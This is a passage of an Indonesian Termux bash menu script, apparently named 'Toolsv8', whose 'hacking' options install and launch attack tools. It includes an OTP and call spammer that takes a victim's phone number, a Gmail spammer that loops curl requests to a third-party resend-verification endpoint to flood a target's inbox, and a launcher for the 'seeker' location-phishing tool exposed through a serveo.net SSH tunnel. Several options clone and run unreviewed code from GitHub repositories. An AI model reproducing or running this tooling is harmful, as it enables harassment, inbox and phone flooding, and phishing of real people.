echo -e "${r}[ ${g}SUKSES ${r}]${y} Menyimpan ke /sdcard/Download/Google.mp3"
echo ""
echo -e "${orange}Tekan Enter Untuk Kembali ke Toolsv8!!!"
           read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
           clear
        ;;
  40)
       echo ""
       mpv --no-video --quiet "$HOME/Goblok/oke.mp3" &> /dev/null &
       echo -e "${cyan} Anda Memilih Menu Hacking...!!"
       echo ""
       echo -e "${red} VIP UNLOCK...!!"
       sleep 2
       clear
r='\033[1;31m'
g='\033[1;32m'
y='\033[1;33m'
c='\033[1;36m'
clear 
echo ""
if python3 -m pip show Crypto >/dev/null 2>&1; then
    echo -e "${r}[ ${g}✓ ${r}]${c} Crypto sudah terinstall..!!"
    sleep 2 
else
    clear 
    echo ""
    echo -e "${r}[ ${g}• ${r}]${y} Menginstall Crypto..!!"
    echo -e "${r}"
    pip install Crypto
fi
if python3 -m pip show pycryptodome >/dev/null 2>&1; then
    clear 
    echo ""
    echo -e "${r}[ ${g}✓ ${r}]${c} pycryptodome sudah terinstall..!!"
    sleep 2 
else
    clear 
    echo ""
    echo -e "${r}[ ${g}• ${r}]${y} Menginstall pycryptodome..!!"
    echo -e "${r}"
    pip install pycryptodome
fi
if command -v node >/dev/null 2>&1; then
    clear 
    echo ""
    echo -e "${r}[ ${g}✓ ${r}]${c} Node.js sudah terinstall..!!"
    sleep 2 
else
    clear 
    echo ""
    echo -e "${r}[ ${g}• ${r}]${y} Menginstall Node.js..!!"
    echo -e "${r}"
    pkg install nodejs-lts -y
fi
if npm list -g vercel >/dev/null 2>&1; then
    clear 
    echo ""
    echo -e "${r}[ ${g}✓ ${r}]${c} Vercel sudah terinstall..!!"
    sleep 2 
else
    clear 
    echo ""
    echo -e "${r}[ ${g}• ${r}]${y} Menginstall Vercel..!!"
    echo -e "${r}"
    npm install -g vercel
fi
clear 
echo ""
echo -e "${r}[ ${g}✓ ${r}]${c} Semua package sudah terinstall semua..!!"
sleep 2 
clear 
echo ""
echo -e "${g} SEDANG MENGINSTAL TOOLS AUTO DESPLOY"
sleep 3
echo -e "${c}"
git clone --depth 32 https://github.com/Blackheat023/Desploy
cd Desploy
clear
python Vertikal.py
echo ""
echo -e "${orange}Tekan Enter Untuk Kembali ke Toolsv8!!!"
read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
clear
   ;;
      41)
            echo ""
            mpv --no-video --quiet "$HOME/Goblok/oke.mp3" &> /dev/null &
            echo -e "${cyan} Anda Memilih Menu Hacking...!!"
            echo ""
            echo -e "${red} VIP UNLOCK...!!"
            sleep 2
            clear
g='\033[32;1m'
c='\033[36;1m'
r='\033[31;1m'
p='\033[35;1m'
y='\033[33;1m'
declare -A SITES=(
    ["GitHub"]="https://github.com/%s"
    ["Twitter"]="https://twitter.com/%s"
    ["Instagram"]="https://www.instagram.com/%s"
    ["SnackVideo"]="https://s.snackvideo.com/@%s"
    ["Telegram"]="https://t.me/%s"
    ["WhatsApp"]="https://wa.me/%s"
    ["Vimeo"]="https://vimeo.com/%s"
    ["YouTube"]="https://www.youtube.com/@%s"
    ["Facebook"]="https://www.facebook.com/%s"
    ["TikTok"]="https://www.tiktok.com/@%s"
    ["Reddit"]="https://www.reddit.com/user/%s"
    ["Pinterest"]="https://www.pinterest.com/%s"
    ["Steam"]="https://steamcommunity.com/id/%s"
    ["Medium"]="https://medium.com/@%s"
    ["Replit"]="https://replit.com/@%s"
    ["CodePen"]="https://codepen.io/%s"
    ["Hackerrank"]="https://www.hackerrank.com/%s"
    ["Dev.to"]="https://dev.to/%s"
    ["Keybase"]="https://keybase.io/%s"
    ["GitLab"]="https://gitlab.com/%s"
    ["Blogger"]="https://%s.blogspot.com"
    ["Dribbble"]="https://dribbble.com/%s"
    ["Behance"]="https://www.behance.net/%s"
    ["Kaggle"]="https://www.kaggle.com/%s"
    ["Last.fm"]="https://www.last.fm/user/%s"
    ["500px"]="https://500px.com/%s"
    ["PayPal"]="https://www.paypal.me/%s"
    ["Dana"]="https://link.dana.id/qr/%s"
    ["OVO"]="https://www.ovo.id/%s"
    ["GoPay"]="https://gopay.co.id/%s"
    ["ShopeePay"]="https://shopee.co.id/pay/%s"
    ["DOKU"]="https://www.doku.com/%s" 
    ["LinkAja"]="https://www.linkaja.id/%s"
    ["JeniusPay"]="https://www.jenius.com/%s"
    ["QRIS"]="https://qris.id/%s"
    ["Gcash"]="https://gcash.com/%s"
    ["Venmo"]="https://venmo.com/%s"
    ["Zelle"]="https://www.zellepay.com/%s"
    ["CashApp"]="https://cash.app/%s"
    ["Stripe"]="https://stripe.com/%s"
    ["Alipay"]="https://intl.alipay.com/%s"
    ["WeChatPay"]="https://pay.weixin.qq.com/%s"
    ["ApplePay"]="https://www.apple.com/apple-pay/%s"
    ["GooglePay"]="https://pay.google.com/%s" 
    ["Spotify"]="https://open.spotify.com/user/%s"
    ["SoundCloud"]="https://soundcloud.com/%s"
    ["RiotGames"]="https://na.op.gg/summoner/userName=%s"
    ["BuyMeACoffee"]="https://www.buymeacoffee.com/%s"
    ["TripAdvisor"]="https://www.tripadvisor.com/Profile/%s"
    ["Fiverr"]="https://www.fiverr.com/%s"
    ["Freelancer"]="https://www.freelancer.com/u/%s"
    ["Wattpad"]="https://www.wattpad.com/user/%s"
    ["Patreon"]="https://www.patreon.com/%s"
    ["Sketchfab"]="https://sketchfab.com/%s"
    ["DeviantArt"]="https://www.deviantart.com/%s"
    ["Gravatar"]="https://en.gravatar.com/%s"
    ["ProductHunt"]="https://www.producthunt.com/@%s"
    ["Flipboard"]="https://flipboard.com/@%s"
    ["About.me"]="https://about.me/%s"
    ["Disqus"]="https://disqus.com/by/%s/"
    ["Vimeo"]="https://vimeo.com/%s"
    ["Trello"]="https://trello.com/%s"
    ["Google"]="https://myaccount.google.com/?authuser=%s"
    ["Gmail"]="https://mail.google.com/mail/u/%s"
    ["Drive"]="https://drive.google.com/drive/u/%s/my-drive"
    ["Photos"]="https://photos.google.com/u/%s"
    ["ChromeSync"]="https://chrome.google.com/sync?account=%s"
    ["YouTube"]="https://www.youtube.com/channel/%s"
    ["Calendar"]="https://calendar.google.com/calendar/u/%s/r"
    ["MyAnimeList"]="https://myanimelist.net/profile/%s"
    ["Bandcamp"]="https://%s.bandcamp.com"
    ["Roblox"]="https://www.roblox.com/user.aspx?username=%s"
    ["Snapchat"]="https://www.snapchat.com/add/%s"
    ["Quora"]="https://www.quora.com/profile/%s"
    ["Linktree"]="https://linktr.ee/%s"
    ["Giphy"]="https://giphy.com/%s/"
    ["Bitbucket"]="https://bitbucket.org/%s/"
    ["OpenSea"]="https://opensea.io/%s"
    ["ArtStation"]="https://www.artstation.com/%s"
    ["ReverbNation"]="https://www.reverbnation.com/%s"
)
banner() {
clear
echo ""
echo "
███████╗██╗███╗   ██╗██████╗ ███████╗██████╗ 
██╔════╝██║████╗  ██║██╔══██╗██╔════╝██╔══██╗
█████╗  ██║██╔██╗ ██║██║  ██║█████╗  ██████╔╝
██╔══╝  ██║██║╚██╗██║██║  ██║██╔══╝  ██╔══██╗
██║     ██║██║ ╚████║██████╔╝███████╗██║  ██║
╚═╝     ╚═╝╚═╝  ╚═══╝╚═════╝ ╚══════╝╚═╝  ╚═╝
" | lolcat
echo -e "${p}        Development ${g}: ${c}By.Thonxyzz404"
echo ""
}
check_username() {
    local username=$1
    echo -e "${r}[ ${g}INFO ${r}]${y} Mengecek username : $username"
    echo ""
    for site in "${!SITES[@]}"; do
        url=$(printf "${SITES[$site]}" "$username")
        status=$(curl -s -o /dev/null -w "%{http_code}" "$url")
        if [[ "$status" == "200" ]]; then
            echo -e "${r}[ ${g}✓ ${r}]${c} $site : Ditemukan → $url"
        elif [[ "$status" == "404" ]]; then
            echo -e "${r}[ ${g}x ${r}]${y} $site : Tidak Ada"
        else
            echo -e "${r}[ ${g}? ${r}]${p} $site : Tidak Pasti (Status: $status)"
        fi
    done
}
run() {
    banner
    echo -e "${g}"
    read -p "🔍 Masukkan username yang ingin dicari : " username
    echo ""
    check_username "$username"
    echo ""
    echo -e "${r}↩️ Tekan Enter untuk keluar...!!"
    read
}
run
            echo -e "${green}Tekan Enter Untuk Kembali ke Toolsv8!!!"
            read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
            clear
               ;;
       42)
               echo ""
               mpv --no-video --quiet "$HOME/Goblok/oke.mp3" &> /dev/null &
               echo -e "${cyan} Anda Memilih Menu Hacking...!!"
               echo ""
               echo -e "${red} VIP UNLOCK...!!"
               sleep 2
               clear
                 cd
packages=("packaging" "utils")
for pkg in "${packages[@]}"; do
    echo ""
    echo -e "${g} Memeriksa paket Python : $pkg"
    if python3 -m pip show "$pkg" > /dev/null 2>&1; then
        echo ""
        echo -e "${r}[ ${g}✓ ${r}]${c} Paket '$pkg' sudah terinstall."
        sleep 2 
        clear 
    else
        echo ""
        echo -e "${r}[ ${g}+ ${r}]${y} Menginstall paket '$pkg' "
        echo -e "${n}"
        python3 -m pip install "$pkg"
        if [ $? -eq 0 ]; then
            clear 
            echo ""
            echo -e "${r}[ ${g}✓ ${r}]${y} Paket '$pkg' berhasil diinstall."
            sleep 2 
            clear 
        else
            clear 
            echo ""
            echo -e "${r} Gagal menginstall paket '$pkg'."
            clear 
        fi
    fi
done
echo ""
echo -e "${g} Mohon bersabar sedang running..!!"
echo -e "${n}"
if [ -d "seeker" ]; then
git clone --depth 32 https://github.com/Zero556723/seeker
cd seeker
python3 seeker.py
git stash &> /dev/null
git pull origin main &> /dev/null
else
git clone --depth 32 https://github.com/Zero556723/seeker
cd seeker
fi
if [ -f "seeker.py" ]; then
python3 seeker.py
else
echo -e "${red}File Tidak Ditemukan..!!"
fi
echo ""
echo -e "${orange}Tekan Enter Untuk Kembali ke Toolsv8!!!"
read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
clear
  ;;
       43)
              echo""
              mpv --no-video --quiet "$HOME/Goblok/oke.mp3" &> /dev/null &
              echo -e "${cyan} Anda Memilih Menu Hacking...!!"
              echo""
              echo -e "${red} VIP UNLOCK...!!"
              sleep 2
              clear
              cd
g='\033[32;1m'
r='\033[31;1m'
y='\033[33;1m'
c='\033[1;36m'
p='\033[35;1m'
n='\033[0m'
echo "
⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣤⣶⣶⣶⣶⣤⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⡀⠀⠀⠀⠀
⠀⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⠀⠀⠀
⠀⢀⣾⣿⣿⣿⣿⡿⠟⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀
⠀⣾⣿⣿⣿⣿⡟⠀⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀
⢠⣿⣿⣿⣿⣿⣧⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄
⢸⣿⣿⣿⣿⣿⣿⣦⠀⠀⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
⠘⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠈⠻⢿⣿⠟⠉⠛⠿⣿⣿⣿⣿⣿⣿⠃
⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⡀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⡿⠀
⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣤⣤⣴⣾⣿⣿⣿⣿⡿⠁⠀
⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠀⠀⠀
⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠁⠀⠀⠀⠀
⠠⠛⠛⠛⠉⠁⠀⠈⠙⠛⠛⠿⠿⠿⠿⠛⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀
" | lolcat 
echo -e "${g}============================"
echo -e "${r}    SPAMMER OTP + CALL"
echo -e "${g}============================"
echo -e "${r}[ ${g}1. ${r}]${y} Masukkan no target."  
echo -e "${r}[ ${g}2. ${r}]${y} Gass serang tuan."
echo -e "${r}[ ${g}3. ${r}]${y} Spam OTP No brutall"
echo -e "${r}[ ${g}4. ${r}]${y} Lihat daftar nomer"
echo -e "${r}[ ${g}5. ${r}]${y} Kembali"
echo -e "${g}============================"
echo -e "${r}   Thonxyzz404_X_Vindra"
echo -e "${g}============================"
echo -e "${c}"
read -p "Masukkan pilihan Anda : " mode  
if [ "$mode" == "1" ]; then  
    echo -e "${p}"
    read -p "Masukkan nomer target : " nomor  
    echo "$nomor" > single.txt 
    echo "$nomor" >> nomor.txt
    echo ""
    echo -e "${g} File sudah terpasang semuanya...!!"
    echo ""
elif [ "$mode" == "2" ]; then  
    if [ ! -f "nomor.txt" ]; then
        clear 
        echo ""
        echo -e "${r}[!] File nomor.txt tidak ditemukan!"  
        echo "" 
    fi  
    clear 
    echo ""
    echo -e "${g} Proses persiapan menyerang tuan 😈🔥"
    echo ""
    sleep 5
    echo -e "${n} Sukses persiapan...!!"
    echo -e "${y}"
    cat nomor.txt
    echo -e "${r}"
    read -p "Silahkan Tekan Entar Untuk Menyrang...!!" x  
    cp nomor.txt ~/.number_otp
    clear 
    echo ""
    echo -e "${g} Menginstall Tools...!!"
    echo -e "${c}"
    git clone https://github.com/SokHengkell022/Haram
    cd Haram
    bash Cok.sh
elif [ "$mode" == "3" ]; then
clear 
echo ""
echo -e "\033[33;1m╔═══════════════════════════════════════╗"
echo -e "\033[31;1m║     Sedang Menginstall Tools!!!       ║"
echo -e "\033[33;1m╚═══════════════════════════════════════╝"
FILE="$HOME/Goblok/Instalv1.mp3"
if [ -f "$FILE" ]; then
mpv --volume=200 --really-quiet "$FILE" &
else
echo -e "${red}File Tidak Ditemukan!!" >&2
fi
echo -e "${green}"
if [ -d "Spam404" ]; then
pkg install php -y
pkg install toilet -y
git clone https://github.com/SokHengkell022/Spam404
cd Spam404
php main.php
git stash &> /dev/null
git pull origin main &> /dev/null
else
git clone https://github.com/SokHengkell022/Spam404
cd Spam404
fi
if [ -f "main.php" ]; then
php main.php
else
echo -e "${red}File Tidak Ditemukan...!!"
fi
elif [ "$mode" == "4" ]; then
clear 
nano nomor.txt
else
    clear 
    echo ""
    echo -e "${r}[!] Pilihan tidak valid."
          fi   
              echo ""
              echo -e "${orange}Tekan Enter Untuk Kembali ke Toolsv8!!!"
              read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
              clear
                 ;;
        44)
              echo ""
              mpv --no-video --quiet "$HOME/Goblok/oke.mp3" &> /dev/null &
              echo -e "${cyan} Anda Memilih Menu Hacking...!!"
              echo ""
              echo -e "${red} VIP UNLOCK...!!"
              sleep 2
              clear
              cd
g='\033[32;1m'
r='\033[31;1m'
y='\033[33;1m'
c='\033[1;36m'
n='\033[0m'
install_if_missing() {
    local cmd=$1
    local pkg=$2
    if ! command -v "$cmd" &> /dev/null; then
        clear 
        echo ""
        echo -e "${r}[ ${g}X ${r}]${y} $cmd ${c}Modull Blum Terinstall...!!"
        sleep 3 
        echo -e "${g}"
        nala install -y "$pkg"
    else
        clear 
        echo ""
        echo -e "${r}[ ${g}✔ ${r}]${y} $cmd ${c}Modules sudah terinstall."
        echo ""
        sleep 2
    fi
}
if ! command -v nala &> /dev/null; then
    clear 
    echo ""
    echo -e "${g} PROSES PENGINSTALAN...!!"
    sleep 2
    echo -e "${n}"
    pkg install nala -y
fi
install_if_missing ssh openssh
install_if_missing figlet figlet
install_if_missing ruby ruby
if ! gem list -i lolcat &> /dev/null; then
    clear 
    echo ""
    echo -e "${g} PROSES PENGINSTALAN...!!"
    sleep 2
    echo -e "${n}"
    gem install lolcat
else
    clear 
    echo ""
    echo -e "${r}[ ${g}✔ ${r}]${c} Modules sudah terinstall."
    echo ""
    sleep 2
fi
clear
echo "
⠀⠀⠀⠀⠀⠀⠀⣀⣤⣶⣿⠷⠾⠛⠛⠛⠛⠷⠶⢶⣶⣤⣄⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣀⣴⡾⠛⠉⠁⠀⣰⡶⠶⠶⠶⠶⠶⣶⡄⠀⠉⠛⠿⣷⣄⡀⠀⠀⠀
⠀⠀⣠⣾⠟⠁⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⣼⠃⠀⠀⠀⠀⠈⠛⢿⣦⡀⠀
⢠⣼⠟⠁⠀⠀⠀⠀⣠⣴⣶⣿⡇⠀⠀⠀⠀⠀⣿⣷⣦⣄⠀⠀⠀⠀⠀⠙⣧⡀
⣿⡇⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⣇⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⢈⣷
⣿⣿⣦⡀⣠⣾⣿⣿⣿⡿⠟⢻⣿⠀⠀⠀⠀⢠⣿⠻⢿⣿⣿⣿⣿⣆⣀⣠⣾⣿
⠉⠻⣿⣿⣿⣿⣽⡿⠋⠀⠀⠸⣿⠀⠀⠀⠀⢸⡿⠀⠀⠉⠻⣿⣿⣿⣿⣿⠟⠁
⠀⠀⠈⠙⠛⣿⣿⠀⠀⠀⠀⢀⣿⠀⠀⠀⠀⢸⣇⠀⠀⠀⠀⣹⣿⡟⠋⠁⠀⠀
⠀⠀⠀⠀⠀⢿⣿⣷⣄⣀⣴⣿⣿⣤⣤⣤⣤⣼⣿⣷⣀⣀⣾⣿⣿⠇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠻⢿⣿⣿⣿⣿⣿⠟⠛⠛⠻⣿⣿⣿⣿⣿⡿⠛⠉⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠁⣿⡇⠀⠀⠀⠀⢸⣿⡏⠙⠋⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣷⣄⠀⠀⣀⣾⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
" | lolcat
echo -e "${g}  Development ${r}: ${c}By.Thonxyzz404"
echo -e "${y}"
read -p "  Masukkan Port ===> : " isi
clear
neofetch --ascii_distro kali
echo ""
echo -e "${c}Port Yang Anda Masukkan :${n} $isi"
echo ""
echo -e "${r}Link di bawah silakan copy dan gunakan : "
echo -e "${n}"
ssh -q -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -R 80:localhost:$isi serveo.net 2>/dev/null
echo ""
echo -e "${orange}Tekan Enter Untuk Kembali ke Toolsv8!!!"
read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
clear
   ;;
        45)
              echo ""
              mpv --no-video --quiet "$HOME/Goblok/oke.mp3" &> /dev/null &
              echo -e "${cyan} Anda Memilih Menu Hacking...!!"
              echo ""
              echo -e "${red} VIP UNLOCK...!!"
              sleep 2
              clear
              cd
b='\033[34;1m'
g='\033[32;1m'
p='\033[35;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
n='\033[0m'
echo "
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣠⣤⣤⣤⡴⣶⣶⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣴⣶⣿⣿⣿⣿⣿⣿⣷⣿⣶⣿⣧⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣄⣀⣀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣾⣿⣿⣿⠿⠿⠛⠛⠛⠋⠉⠉⠉⠛⠛⠛⠛⠿⠟⠛⠛⠛⠛⠛⠛⠛⠛⠛⣻⣿⣿⠋⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣠⣴⣿⣿⣿⠟⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣟⡁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⣾⣿⣿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠴⠿⠿⠿⣿⣿⣷⣦⡀⠀⠀⠀⠀
⠀⠀⠀⢰⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣠⣄⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⣶⣄⠀⠀
⠀⠀⠀⢸⣿⣿⣿⣦⣤⣤⣀⣀⣀⣀⣠⣤⠴⠖⠋⢉⣽⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠧⡀
⠀⠀⢠⣿⠟⠉⠁⠈⠉⠉⠙⠛⠛⠿⠿⣿⣿⣿⣿⣿⣿⠿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈
⠀⢠⣿⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠽⠟⠛⠉⠀⢀⣀⣤⣴⣶⣶⣶⣶⣶⣶⣤⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣿⣿⣿⣷⣶⣦⣤⣤⣤⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠁⠀⠀⠀⠀⠀⠀⠈⠉⠛⠿⣿⣿⣿⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢸⣿⠘⢿⣿⣿⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣤⣤⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠈⣿⣴⣿⣿⣄⠀⠀⠀⠀⠀⣀⣠⣴⠶⣿⣿⠋⠉⠉⠉⠙⢻⣿⡆⠀⠀⠀⠀⠀⠀⣀⣴⣶⣿⣿⣿⣿⣿⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢹⣿⡍⠛⠻⢷⣶⣶⣶⠟⢿⣿⠗⠀⠹⠃⡀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⢀⣴⣿⣿⣿⣿⠿⠿⠛⠛⠛⠛⠛⠂⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢻⡇⠀⠀⠀⢻⣿⣿⠀⠈⠛⠀⠀⠀⢹⠇⠀⠀⠀⠀⢶⣿⠇⠀⢀⣴⣿⣿⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠁⠀⠀⠀⠀⠹⡇⠀⠀⠀⠀⠀⣀⡾⠀⠀⠀⠀⠀⢸⡿⠀⣠⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⣦⠀⠀⢠⣿⢳⠀⠀⠀⠙⣿⣿⠁⢰⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⣿⣷⡾⠿⠃⢸⣷⣀⠀⢀⣾⠃⢀⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⠻⠷⢾⣿⣿⣷⡿⠁⠀⢸⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⢿⣷⣄⠀⠀⠉⠛⠀⠀⠀⢸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⣿⣦⣄⡀⠀⠀⠀⢸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⣿⣶⣶⣾⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠛⠿⠧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
" | lolcat
              echo -e "\033[31;1m╔══════════════════════════════╗"
              echo -e "\033[31;1m║\033[36;1m        SPAMMER_GMAIL      \033[31;1m   ║"
              echo -e "\033[31;1m╚══════════════════════════════╝"
              echo -e "\033[31;1m║   ${r}[ ${g}01 ${r}] ${y}Spammer_V1    ${r}      ║"
              echo -e "\033[31;1m║   ${r}[ ${g}02 ${r}] ${y}Spammer_V2     ${r}     ║"
              echo -e "\033[31;1m║   ${r}[ ${g}03 ${r}] ${y}Spammer_V3     ${r}     ║"
              echo -e "\033[31;1m║   ${r}[ ${g}04 ${r}] ${y}Spammer_V4     ${r}     ║"
              echo -e "\033[31;1m║   ${r}[ ${g}05 ${r}] ${y}Kembali Ke Awall ${r}   ║"
              echo -e "\033[31;1m╔══════════════════════════════╗"
              echo -e "\033[31;1m║\033[36;1m        BY.THONXYZZ404     \033[31;1m   ║"
              echo -e "\033[31;1m╚══════════════════════════════╝"
echo -e "${g}"
read -p "Masukkan pilihan Anda : " kuy
case $kuy in
1|01)
if [ -f "license.txt" ]; then
    last_execution_time=$(cat "license.txt")
    current_time=$(date +%s)
    time_diff=$((current_time - last_execution_time))
    if [ "$time_diff" -lt 10800 ]; then
        echo ""
        echo -e "${r}[ ${g}ERROR ${r}]${y} Anda harus menunggu minimal 3 jam sebelum menggunakan skrip lagi."
        sleep 5
        echo ""
        clear
    fi
fi
echo -e "${c}"
read -p "Masukkan Gmail Target : " email
echo -e "${y}"
read -p "Masukkan batas jumlah permintaan (maksimal 10) : " LIMIT
echo ""
if ! [[ "$LIMIT" =~ ^[0-9]+$ ]] || [ "$LIMIT" -le 0 ] || [ "$LIMIT" -gt 10 ]; then
    echo -e "${r}[ ${g}ERROR ${r}]${y} Batas jumlah permintaan harus berupa angka positif dan tidak lebih dari 10."
    sleep 5 
    echo ""
    clear 
fi
BASE_URL="https://pasukansalman.smartseller.co.id/register/resend_verification_email"
NAME="kontol"
URL="${BASE_URL}?email=${email}&name=${NAME}"
INTERVAL=10
echo -e "${n}========================================="
echo -e "${g}Konfigurasi Permintaan:"
echo -e "${c}Gmail  : $email"
echo -e "${c}Interval : $INTERVAL detik"
echo -e "${c}Batas   : $LIMIT permintaan"
echo -e "${n}========================================="
echo -e "${p}"
count=0
while [ $count -lt $LIMIT ]; do
    curl -s "$URL" > /dev/null
    echo "[$(date)] Permintaan ke-$((count + 1)) dikirim"
    count=$((count + 1))
    sleep $INTERVAL
done
date +%s > license.txt
echo ""
echo -e "${r}========================================="
echo -e "${g}   Selesai mengirim sebanyak $LIMIT kali."
echo -e "${r}========================================="
echo ""
echo -e "${orange}Tekan Enter Untuk Kembali ke Toolsv8!!!"
read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
clear
    ;;
 2|02)
m="\033[1;31m"
p="\033[0m"
k="\033[1;33m"
b="\033[1;36m"
res="\033[0m"
g='\033[32;1m'
r='\033[31;1m'
y='\033[33;1m'
c='\033[1;36m'
if ! command -v boxes &> /dev/null; then
    clear 
    echo ""
    echo -e "${r}[ ${g}x ${r}]${c} Modules blum terinstall menginstall..!!${n}"
    echo -e "${n}"
    pkg install boxes -y
else
    clear 
    echo ""
    echo -e "${r}[ ${g}✓ ${r}]${y} Modules sudah terinstall.${n}"
    sleep 2 
    clear 
fi
m="\033[1;31m"
p="\033[0m"
k="\033[1;33m"
b="\033[1;36m"
res="\033[0m"
g='\033[32;1m'
r='\033[31;1m'
y='\033[33;1m'
c='\033[1;36m'
cok="ansi-rounded"
banner() {
echo -e "
${m}███████╗ ██████╗ ███╗   ███╗ █████╗ ██╗██╗${res}     
${m}██╔════╝██╔════╝ ████╗ ████║██╔══██╗██║██║${res}
${m}███████╗██║  ███╗██╔████╔██║███████║██║██║${res}     
${p}╚════██║██║   ██║██║╚██╔╝██║██╔══██║██║██║${res}     
${p}███████║╚██████╔╝██║ ╚═╝ ██║██║  ██║██║███████╗${res}
